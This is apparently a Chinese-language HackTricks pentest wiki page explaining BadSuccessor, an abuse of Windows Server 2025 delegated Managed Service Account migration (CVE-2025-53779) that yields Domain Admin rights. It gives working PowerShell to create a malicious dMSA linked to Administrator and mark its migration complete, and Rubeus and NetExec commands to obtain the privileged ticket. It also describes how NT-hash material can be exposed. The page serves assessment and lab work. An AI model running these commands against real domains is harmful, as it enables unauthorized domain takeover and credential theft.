# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 概述

**BadSuccessor** 滥用 **delegated Managed Service Account**（**dMSA**）迁移工作流，该工作流由 **Windows Server 2025** 引入。dMSA 可以通过 **`msDS-ManagedAccountPrecededByLink`** 与旧账户关联，并通过存储在 **`msDS-DelegatedMSAState`** 中的迁移状态进行迁移。如果攻击者能够在可写 OU 中创建 dMSA 并控制这些属性，KDC 就可以为攻击者控制的 dMSA 签发 ticket，并使用关联账户的**授权上下文**。<sup>[[2]](#references)</sup>

实际上，这意味着低权限用户只要拥有委派的 OU 权限，就可以创建新的 dMSA，将其指向 `Administrator`，完成迁移状态，然后获取一个 TGT，其 PAC 中包含 **Domain Admins** 等高权限组。<sup>[[2]](#references)</sup>

## 重要的 dMSA 迁移细节

- dMSA 是 **Windows Server 2025** 的功能。
- `Start-ADServiceAccountMigration` 会将迁移设置为 **started** 状态。
- `Complete-ADServiceAccountMigration` 会将迁移设置为 **completed** 状态。
- `msDS-DelegatedMSAState = 1` 表示迁移已开始。
- `msDS-DelegatedMSAState = 2` 表示迁移已完成。
- 在合法迁移期间，dMSA 应透明地替代被取代的账户，因此 KDC/LSA 会保留原账户已有的访问权限。<sup>[[3]](#references)</sup>

Microsoft Learn 还指出，在迁移期间，原账户会与 dMSA 关联，并且 dMSA 旨在访问旧账户能够访问的资源。<sup>[[3]](#references)</sup> 这正是 BadSuccessor 所滥用的安全假设。<sup>[[2]](#references)</sup>

## 要求

1. 域中存在 **dMSA**，这意味着 AD 端支持 **Windows Server 2025**。
2. 攻击者可以在某个 OU 中**创建** `msDS-DelegatedManagedServiceAccount` 对象，或在该 OU 中拥有等效的广泛子对象创建权限。
3. 攻击者可以**写入**相关 dMSA 属性，或完全控制其刚刚创建的 dMSA。
4. 攻击者可以从已加入域的上下文，或从能够连接到 LDAP/Kerberos 的 tunnel 中请求 Kerberos tickets。<sup>[[2]](#references)</sup>

### 实际检查

最清晰的 operator 信号是验证域/forest level，并确认环境已经使用新的 Server 2025 stack：
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
如果看到 `Windows2025Domain` 和 `Windows2025Forest` 等值，请将 **BadSuccessor / dMSA migration abuse** 作为优先检查项。

你还可以使用公开工具枚举被委派了 dMSA 创建权限的可写 OU：<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. 在你拥有 delegated create-child rights 的 OU 中创建一个 dMSA。
2. 将 **`msDS-ManagedAccountPrecededByLink`** 设置为特权目标的 DN，例如 `CN=Administrator,CN=Users,DC=corp,DC=local`。
3. 将 **`msDS-DelegatedMSAState`** 设置为 `2`，将迁移标记为已完成。
4. 为新的 dMSA 请求 TGT，并使用返回的 ticket 访问特权服务。<sup>[[2]](#references)</sup>

PowerShell 示例：<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket 请求 / 操作工具示例：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## 为什么这不只是 privilege escalation

在合法迁移期间，Windows 还需要让新的 dMSA 处理在切换前为旧账户签发的 tickets。这也是为什么与 dMSA 相关的 ticket material 在 **`KERB-DMSA-KEY-PACKAGE`** 流程中可能包含 **current** 和 **previous** keys。<sup>[[2]](#references)</sup>

对于由攻击者控制的 fake migration，这种行为可能使 BadSuccessor 转变为：<sup>[[2]](#references)</sup>

- 通过在 PAC 中继承特权组 SID 实现 **Privilege escalation**。
- **Credential material exposure**，因为 previous-key 处理可能在易受攻击的工作流中暴露等同于前任账户 RC4/NT hash 的 material。

因此，该技术既可用于直接接管域，也可用于后续操作，例如 pass-the-hash 或更广泛的 credential compromise。

## 关于补丁状态的说明

最初的 BadSuccessor 行为**不只是理论上的 2025 预览问题**。Microsoft 已为其分配 **CVE-2025-53779**，并于 **2025 年 8 月**发布了安全更新。<sup>[[4]](#references)</sup> 在以下场景中仍应记录此攻击：

- **labs / CTFs / assume-breach exercises**
- **未打补丁的 Windows Server 2025 环境**
- **评估期间对 OU delegations 和 dMSA exposure 的验证**

不要仅因为存在 dMSA，就假设 Windows Server 2025 域存在漏洞；请核实补丁级别并谨慎测试。

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB：Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor：Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts 概述](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
